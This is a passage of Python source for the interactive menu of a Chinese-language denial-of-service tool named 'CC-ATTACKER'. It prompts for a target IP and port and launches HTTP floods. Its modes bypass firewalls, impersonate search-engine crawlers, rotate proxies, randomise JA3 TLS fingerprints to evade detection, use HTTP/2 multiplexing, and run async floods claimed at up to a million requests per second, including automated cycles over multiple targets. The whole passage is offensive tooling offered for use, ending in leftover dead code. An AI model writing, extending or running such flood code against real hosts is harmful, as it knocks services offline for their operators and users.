            if tool.start_attack(ip, port, use_ssl, threads, attack_type, duration, bypass_firewall=False, use_proxy=use_proxy, search_engine=False, proxy_rotation=proxy_rotation, use_ja3=use_ja3, use_http2=use_http2):
                print(f"\n✅ 攻击已启动! 模式: {tool.CONFIG['attack_types'][attack_type]['name']}")
                if use_ja3:
                    print("🔐 JA3指纹随机化已启用")
                if use_http2:
                    print("🌐 HTTP/2多路复用已启用")
                if duration:
                    print(f"⏰ 将在 {duration} 秒后自动停止")
                else:
                    print("🛑 请在主菜单选择9来停止攻击")
            else:
                print("❌ 攻击启动失败")

        elif choice == "2":
            ip = input("🎯 请输入目标IP地址: ").strip()
            if not ip:
                print("❌ IP地址不能为空")
                continue
            
            try:
                port = int(input("🔢 请输入端口号: ").strip())
                if not (1 <= port <= 65535):
                    print("❌ 端口号必须在1-65535之间")
                    continue
            except:
                print("❌ 无效的端口号")
                continue

            use_ssl = input("🔒 使用HTTPS? (y/N): ").strip().lower() == 'y'
            
            use_ja3 = False
            use_http2 = False
            if use_ssl:
                use_ja3 = input("🔐 启用JA3指纹随机化? (y/N): ").strip().lower() == 'y'
                if use_ja3 and not JA3_AVAILABLE:
                    print("⚠️ JA3不可用，请安装: pip install tls-client")
                    use_ja3 = False
                
                use_http2 = input("🌐 启用HTTP/2多路复用? (y/N): ").strip().lower() == 'y'
                if use_http2 and not HTTP2_AVAILABLE:
                    print("⚠️ HTTP/2不可用，请安装: pip install h2")
                    use_http2 = False
                
            try:
                threads = int(input(f"🛡️ 设置线程数 (1-{tool.CONFIG['max_threads']}): ").strip())
                threads = max(1, min(threads, tool.CONFIG['max_threads']))
            except:
                print("⚠️ 无效线程数，使用默认值1000")
                threads = 1000

            try:
                duration_input = input("⏰ 持续时间(秒，留空为手动停止): ").strip()
                duration = int(duration_input) if duration_input else None
            except:
                duration = None

            use_proxy = input("🔌 使用代理? (y/N): ").strip().lower() == 'y'
            if use_proxy and not tool.proxies:
                print("⚠️ 代理列表为空，将使用直连")
                use_proxy = False

            proxy_rotation = input("🔄 启用代理轮换? (y/N): ").strip().lower() == 'y'

            print("\n🛡️ 防火墙绕过模式已激活!")
            print("💡 系统将自动使用多种技术绕过防火墙检测")

            if tool.start_attack(ip, port, use_ssl, threads, "bypass_firewall", duration, bypass_firewall=True, use_proxy=use_proxy, search_engine=False, proxy_rotation=proxy_rotation, use_ja3=use_ja3, use_http2=use_http2):
                print(f"\n✅ 防火墙绕过攻击已启动!")
                if use_ja3:
                    print("🔐 JA3指纹随机化已启用")
                if use_http2:
                    print("🌐 HTTP/2多路复用已启用")
                if duration:
                    print(f"⏰ 将在 {duration} 秒后自动停止")
                else:
                    print("🛑 请在主菜单选择9来停止攻击")
            else:
                print("❌ 攻击启动失败")

        elif choice == "3":
            ip = input("🎯 请输入目标IP地址: ").strip()
            if not ip:
                print("❌ IP地址不能为空")
                continue
            
            try:
                port = int(input("🔢 请输入端口号: ").strip())
                if not (1 <= port <= 65535):
                    print("❌ 端口号必须在1-65535之间")
                    continue
            except:
                print("❌ 无效的端口号")
                continue

            use_ssl = input("🔒 使用HTTPS? (y/N): ").strip().lower() == 'y'
            
            use_ja3 = False
            use_http2 = False
            if use_ssl:
                use_ja3 = input("🔐 启用JA3指纹随机化? (y/N): ").strip().lower() == 'y'
                if use_ja3 and not JA3_AVAILABLE:
                    print("⚠️ JA3不可用，请安装: pip install tls-client")
                    use_ja3 = False
                
                use_http2 = input("🌐 启用HTTP/2多路复用? (y/N): ").strip().lower() == 'y'
                if use_http2 and not HTTP2_AVAILABLE:
                    print("⚠️ HTTP/2不可用，请安装: pip install h2")
                    use_http2 = False
                
            try:
                threads = int(input(f"🛡️ 设置线程数 (1-{tool.CONFIG['max_threads']}): ").strip())
                threads = max(1, min(threads, tool.CONFIG['max_threads']))
            except:
                print("⚠️ 无效线程数，使用默认值1000")
                threads = 1000

            try:
                duration_input = input("⏰ 持续时间(秒，留空为手动停止): ").strip()
                duration = int(duration_input) if duration_input else None
            except:
                duration = None

            use_proxy = input("🔌 使用代理? (y/N): ").strip().lower() == 'y'
            if use_proxy and not tool.proxies:
                print("⚠️ 代理列表为空，将使用直连")
                use_proxy = False

            proxy_rotation = input("🔄 启用代理轮换? (y/N): ").strip().lower() == 'y'

            print("\n🔍 搜索引擎模拟模式已激活!")
            print("💡 系统将模拟百度、谷歌、必应等搜索引擎的爬虫请求")

            if tool.start_attack(ip, port, use_ssl, threads, "search_engine", duration, bypass_firewall=False, use_proxy=use_proxy, search_engine=True, proxy_rotation=proxy_rotation, use_ja3=use_ja3, use_http2=use_http2):
                print(f"\n✅ 搜索引擎模拟攻击已启动!")
                if use_ja3:
                    print("🔐 JA3指纹随机化已启用")
                if use_http2:
                    print("🌐 HTTP/2多路复用已启用")
                if duration:
                    print(f"⏰ 将在 {duration} 秒后自动停止")
                else:
                    print("🛑 请在主菜单选择9来停止攻击")
            else:
                print("❌ 攻击启动失败")

        elif choice == "4":
            ip = input("🎯 请输入目标IP地址: ").strip()
            if not ip:
                print("❌ IP地址不能为空")
                continue
            
            try:
                port = int(input("🔢 请输入端口号: ").strip())
                if not (1 <= port <= 65535):
                    print("❌ 端口号必须在1-65535之间")
                    continue
            except:
                print("❌ 无效的端口号")
                continue

            use_ssl = input("🔒 使用HTTPS? (y/N): ").strip().lower() == 'y'
            
            use_ja3 = False
            use_http2 = False
            if use_ssl:
                use_ja3 = input("🔐 启用JA3指纹随机化? (y/N): ").strip().lower() == 'y'
                if use_ja3 and not JA3_AVAILABLE:
                    print("⚠️ JA3不可用，请安装: pip install tls-client")
                    use_ja3 = False
                
                use_http2 = input("🌐 启用HTTP/2多路复用? (y/N): ").strip().lower() == 'y'
                if use_http2 and not HTTP2_AVAILABLE:
                    print("⚠️ HTTP/2不可用，请安装: pip install h2")
                    use_http2 = False
                
            try:
                threads = int(input(f"🛡️ 设置线程数 (1-{tool.CONFIG['max_threads']}): ").strip())
                threads = max(1, min(threads, tool.CONFIG['max_threads']))
            except:
                print("⚠️ 无效线程数，使用默认值1000")
                threads = 1000

            try:
                duration_input = input("⏰ 持续时间(秒，留空为手动停止): ").strip()
                duration = int(duration_input) if duration_input else None
            except:
                duration = None

            if not tool.proxies:
                print("❌ 代理列表为空，请先添加代理")
                continue

            print(f"\n🔄 代理轮换模式已激活!")
            print(f"💡 系统将使用 {len(tool.proxies)} 个代理进行轮换攻击")

            if tool.start_attack(ip, port, use_ssl, threads, "proxy_rotation", duration, bypass_firewall=False, use_proxy=True, search_engine=False, proxy_rotation=True, use_ja3=use_ja3, use_http2=use_http2):
                print(f"\n✅ 代理轮换攻击已启动!")
                if use_ja3:
                    print("🔐 JA3指纹随机化已启用")
                if use_http2:
                    print("🌐 HTTP/2多路复用已启用")
                if duration:
                    print(f"⏰ 将在 {duration} 秒后自动停止")
                else:
                    print("🛑 请在主菜单选择9来停止攻击")
            else:
                print("❌ 攻击启动失败")

        elif choice == "5":
            ip = input("🎯 请输入目标IP地址: ").strip()
            if not ip:
                print("❌ IP地址不能为空")
                continue
            
            try:
                port = int(input("🔢 请输入端口号: ").strip())
                if not (1 <= port <= 65535):
                    print("❌ 端口号必须在1-65535之间")
                    continue
            except:
                print("❌ 无效的端口号")
                continue

            use_ssl = input("🔒 使用HTTPS? (y/N): ").strip().lower() == 'y'
            if not use_ssl:
                print("❌ JA3指纹随机化仅支持HTTPS目标")
                continue
            
            try:
                threads = int(input(f"🛡️ 设置线程数 (1-{tool.CONFIG['max_threads']}): ").strip())
                threads = max(1, min(threads, tool.CONFIG['max_threads']))
            except:
                print("⚠️ 无效线程数，使用默认值1000")
                threads = 1000

            try:
                duration_input = input("⏰ 持续时间(秒，留空为手动停止): ").strip()
                duration = int(duration_input) if duration_input else None
            except:
                duration = None

            use_proxy = input("🔌 使用代理? (y/N): ").strip().lower() == 'y'
            if use_proxy and not tool.proxies:
                print("⚠️ 代理列表为空，将使用直连")
                use_proxy = False

            proxy_rotation = input("🔄 启用代理轮换? (y/N): ").strip().lower() == 'y'

            print("\n🔐 JA3指纹随机化模式已激活!")
            print("💡 系统将随机化TLS指纹以绕过安全检测")

            if tool.start_attack(ip, port, use_ssl, threads, "ja3_random", duration, bypass_firewall=False, use_proxy=use_proxy, search_engine=False, proxy_rotation=proxy_rotation, use_ja3=True, use_http2=False):
                print(f"\n✅ JA3指纹随机化攻击已启动!")
                if duration:
                    print(f"⏰ 将在 {duration} 秒后自动停止")
                else:
                    print("🛑 请在主菜单选择9来停止攻击")
            else:
                print("❌ 攻击启动失败")

        elif choice == "6":
            ip = input("🎯 请输入目标IP地址: ").strip()
            if not ip:
                print("❌ IP地址不能为空")
                continue
            
            try:
                port = int(input("🔢 请输入端口号: ").strip())
                if not (1 <= port <= 65535):
                    print("❌ 端口号必须在1-65535之间")
                    continue
            except:
                print("❌ 无效的端口号")
                continue

            use_ssl = input("🔒 使用HTTPS? (y/N): ").strip().lower() == 'y'
            if not use_ssl:
                print("❌ HTTP/2攻击仅支持HTTPS目标")
                continue
            
            try:
                threads = int(input(f"🛡️ 设置线程数 (1-{tool.CONFIG['max_threads']}): ").strip())
                threads = max(1, min(threads, tool.CONFIG['max_threads']))
            except:
                print("⚠️ 无效线程数，使用默认值1000")
                threads = 1000

            try:
                duration_input = input("⏰ 持续时间(秒，留空为手动停止): ").strip()
                duration = int(duration_input) if duration_input else None
            except:
                duration = None

            use_proxy = input("🔌 使用代理? (y/N): ").strip().lower() == 'y'
            if use_proxy and not tool.proxies:
                print("⚠️ 代理列表为空，将使用直连")
                use_proxy = False

            print("\n🌐 HTTP/2洪水攻击模式已激活!")
            print("💡 系统将使用HTTP/2多路复用协议，大幅提升攻击效率")

            if tool.start_attack(ip, port, use_ssl, threads, "http2_flood", duration, bypass_firewall=False, use_proxy=use_proxy, search_engine=False, proxy_rotation=False, use_ja3=False, use_http2=True):
                print(f"\n✅ HTTP/2洪水攻击已启动!")
                if duration:
                    print(f"⏰ 将在 {duration} 秒后自动停止")
                else:
                    print("🛑 请在主菜单选择9来停止攻击")
            else:
                print("❌ 攻击启动失败")

        elif choice == "7":
            ip = input("🎯 请输入目标IP地址: ").strip()
            if not ip:
                print("❌ IP地址不能为空")
                continue
            
            try:
                port = int(input("🔢 请输入端口号: ").strip())
                if not (1 <= port <= 65535):
                    print("❌ 端口号必须在1-65535之间")
                    continue
            except:
                print("❌ 无效的端口号")
                continue

            use_ssl = input("🔒 使用HTTPS? (y/N): ").strip().lower() == 'y'
            
            try:
                concurrency = int(input(f"🚀 设置并发数 (1-{tool.CONFIG['max_async_tasks']}): ").strip())
                concurrency = max(1, min(concurrency, tool.CONFIG['max_async_tasks']))
            except:
                print("⚠️ 无效并发数，使用默认值50000")
                concurrency = 50000

            try:
                total_requests = int(input("🎯 总请求数 (默认100万): ").strip() or "1000000")
                total_requests = max(1000, total_requests)
            except:
                print("⚠️ 无效请求数，使用默认值100万")
                total_requests = 1000000

            try:
                duration_input = input("⏰ 持续时间(秒，留空为完成所有请求): ").strip()
                duration = int(duration_input) if duration_input else None
            except:
                duration = None

            print("\n⚡ 异步攻击模式:")
            async_modes = {
                "1": "async_http_flood",
                "2": "async_http2_flood", 
                "3": "async_post_flood",
                "4": "async_random_method"
            }
            print("   1. 异步HTTP洪水 - 超高并发GET/POST请求")
            print("   2. 异步HTTP/2洪水 - 异步HTTP/2多路复用")
            print("   3. 异步POST洪水 - 大数据POST攻击")
            print("   4. 异步随机方法 - 随机HTTP方法攻击")
            
            mode_choice = input("🎲 选择模式(默认1): ").strip() or "1"
            attack_type = async_modes.get(mode_choice, "async_http_flood")

            print(f"\n💡 异步攻击优势:")
            print("   - 单机可达 200k-1M RPS")
            print("   - 内存占用降低 70%")
            print("   - 无GIL限制，真正高并发")
            print("   - 自动连接复用和DNS缓存")

            if tool.start_async_attack(ip, port, use_ssl, concurrency, total_requests, attack_type, duration):
                print(f"\n✅ 异步攻击已启动!")
                print(f"🚀 预计性能: 200,000-1,000,000 RPS")
                if duration:
                    print(f"⏰ 将在 {duration} 秒后自动停止")
                else:
                    print(f"🎯 将发送 {total_requests} 个请求后停止")
                print("🛑 请在主菜单选择10来停止异步攻击")
            else:
                print("❌ 异步攻击启动失败")

        elif choice == "8":
            print("\n🔄 自动化循环攻击配置")
            targets = []
            while True:
                print(f"\n当前目标数量: {len(targets)}")
                ip = input("🎯 请输入目标IP地址 (输入空行结束): ").strip()
                if not ip:
                    if not targets:
                        print("❌ 至少需要一个目标")
                        continue
                    break
                
                try:
                    port = int(input("🔢 请输入端口号: ").strip())
                    if not (1 <= port <= 65535):
                        print("❌ 端口号必须在1-65535之间")
                        continue
                except:
                    print("❌ 无效的端口号")
                    continue

                use_ssl = input("🔒 使用HTTPS? (y/N): ").strip().lower() == 'y'
                
                target = tool._parse_ip_target(ip, port, use_ssl)
                if target:
                    targets.append(target)
                    print(f"✅ 已添加目标: {ip}:{port} ({'HTTPS' if use_ssl else 'HTTP'})")
                else:
                    print("❌ 目标添加失败")
            
            try:
                threads = int(input(f"🛡️ 设置线程数 (1-{tool.CONFIG['max_threads']}): ").strip())
                threads = max(1, min(threads, tool.CONFIG['max_threads']))
            except:
                print("⚠️ 无效线程数，使用默认值1000")
                threads = 1000

            try:
                cycles = int(input("🔁 循环次数 (默认10): ").strip() or "10")
                cycles = max(1, cycles)
            except:
                cycles = 10

            try:
                cycle_duration = int(input("⏱️ 每轮持续时间(秒，默认60): ").strip() or "60")
                cycle_duration = max(10, cycle_duration)
            except:
                cycle_duration = 60

            attack_mode = input("🎲 攻击模式 (1-常规 2-防火墙绕过 3-搜索引擎模拟 4-代理轮换 5-JA3指纹 6-HTTP/2 7-异步攻击): ").strip()
            if attack_mode == "2":
                bypass = True
                search_engine = False
                proxy_rotation = False
                use_ja3 = False
                use_http2 = False
                async_attack = False
            elif attack_mode == "3":
                bypass = False
                search_engine = True
                proxy_rotation = False
                use_ja3 = False
                use_http2 = False
                async_attack = False
            elif attack_mode == "4":
                bypass = False
                search_engine = False
                proxy_rotation = True
                use_ja3 = False
                use_http2 = False
                async_attack = False
                if not tool.proxies:
                    print("❌ 代理列表为空，无法使用代理轮换模式")
                    continue
            elif attack_mode == "5":
                bypass = False
                search_engine = False
                proxy_rotation = False
                use_ja3 = True
                use_http2 = False
                async_attack = False
                if not any(t['ssl'] for t in targets):
                    print("❌ JA3模式需要HTTPS目标")
                    continue
            elif attack_mode == "6":
                bypass = False
                search_engine = False
                proxy_rotation = False
                use_ja3 = False
                use_http2 = True
                async_attack = False
                if not any(t['ssl'] for t in targets):
                    print("❌ HTTP/2模式需要HTTPS目标")
                    continue
            elif attack_mode == "7":
                bypass = False
                search_engine = False
                proxy_rotation = False
                use_ja3 = False
                use_http2 = False
                async_attack = True
            else:
                bypass = False
                search_engine = False
                proxy_rotation = False
                use_ja3 = False
                use_http2 = False
                async_attack = False

            use_proxy = input("🔌 使用代理? (y/N): ").strip().lower() == 'y'
            if use_proxy and not tool.proxies:
                print("⚠️ 代理列表为空，将使用直连")
                use_proxy = False

            if async_attack:
                # 异步自动化循环
                concurrency = 50000
                total_requests = 100000
                attack_type = "async_http_flood"
                
                if tool.start_auto_cycle_attack(targets, concurrency, cycles, cycle_duration, bypass, use_proxy, search_engine, proxy_rotation):
                    print(f"\n✅ 异步自动化循环攻击已启动!")
                    print("🌐 异步高并发模式已启用")
                    print("🛑 请在主菜单选择11来停止自动化循环")
                else:
                    print("❌ 异步自动化循环攻击启动失败")
            else:
                if tool.start_auto_cycle_attack(targets, threads, cycles, cycle_duration, bypass, use_proxy, search_engine, proxy_rotation):
                    print(f"\n✅ 自动化循环攻击已启动!")
                    if use_http2:
                        tool.use_http2 = True
                        print("🌐 HTTP/2多路复用已启用")
                    print("🛑 请在主菜单选择11来停止自动化循环")
                else:
                    print("❌ 自动化循环攻击启动失败")

        elif choice == "9":
            if tool.async_running:
                tool.stop_async_attack()
            else:
                tool.stop_attack()

        elif choice == "10":
            tool.stop_async_attack()

        elif choice == "11":
            tool.stop_auto_cycle_attack()

        elif choice == "12":
            status = tool.show_status()
            print(status)

        elif choice == "13":
            tool.show_sessions()

        elif choice == "14":
            print("\n🔌 [代理管理]")
            print("1. 查看代理列表")
            print("2. 添加单个代理")
            print("3. 批量导入代理")
            print("4. 删除代理")
            print("5. 清空代理")
            print("6. 重新加载代理文件")
            
            proxy_choice = input("请选择: ").strip()
            
            if proxy_choice == "1":
                tool.show_proxies()
            elif proxy_choice == "2":
                proxy = input("请输入代理 (格式: ip:port 或 http://ip:port): ").strip()
                if tool.add_proxy(proxy):
                    print("✅ 代理添加成功")
                else:
                    print("❌ 代理添加失败")
            elif proxy_choice == "3":
                file_path = input("请输入代理文件路径 (直接回车使用默认代理.txt): ").strip()
                if not file_path:
                    file_path = "代理.txt"
                
                if os.path.exists(file_path):
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            new_proxies = []
                            for line in f:
                                line = line.strip()
                                if line and not line.startswith('#'):
                                    if "://" not in line:
                                        line = f"http://{line}"
                                    new_proxies.append(line)
                            
                        tool.proxies.extend(new_proxies)
                        tool.save_proxies()
                        print(f"✅ 已批量导入 {len(new_proxies)} 个代理")
                    except Exception as e:
                        print(f"❌ 导入代理文件失败: {e}")
                else:
                    print("❌ 代理文件不存在")
            elif proxy_choice == "4":
                tool.show_proxies()
                if tool.proxies:
                    try:
                        index = int(input("请输入要删除的代理编号: ").strip()) - 1
                        if 0 <= index < len(tool.proxies):
                            proxy = tool.proxies[index]
                            if tool.remove_proxy(proxy):
                                print("✅ 代理删除成功")
                            else:
                                print("❌ 代理删除失败")
                        else:
                            print("❌ 无效的编号")
                    except:
                        print("❌ 无效的输入")
            elif proxy_choice == "5":
                tool.clear_proxies()
                print("✅ 代理列表已清空")
            elif proxy_choice == "6":
                tool.load_proxies()
            else:
                print("❌ 无效选择")

        elif choice == "15":
            tool.clear_sessions()

        elif choice == "0":
            if tool.running or tool.async_running or tool.auto_cycle_running:
                tool.stop_async_attack()
                tool.stop_auto_cycle_attack()
                tool.stop_attack()
            print("👋 感谢使用CC-ATTACKER！")
            break
            
        else:
            print("❌ 无效选择，请重新输入")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n👋 程序被用户中断")
    except Exception as e:
        print(f"\n\n❌ 程序异常: {e}")
                
if __name__ == "__main__":
    main()
    # 在攻击启动前询问是否使用JA3
if False:  # 关键：条件为False，内部代码永不运行
    if __name__ == "__main__":
        main()
        # 在攻击启动前询问是否使用JA3
    if target['ssl']:  # 只有HTTPS目标才需要JA3
        use_ja3 = input("🔐 启用JA3指纹随机化? (Y/n): ").strip().lower() != 'n'
        if use_ja3 and not JA3_AVAILABLE:
            print("⚠️ JA3不可用，请安装: pip install tls-client")
            use_ja3 = False
    else:
        use_ja3 = False
    # 在启动攻击时传递use_ja3参数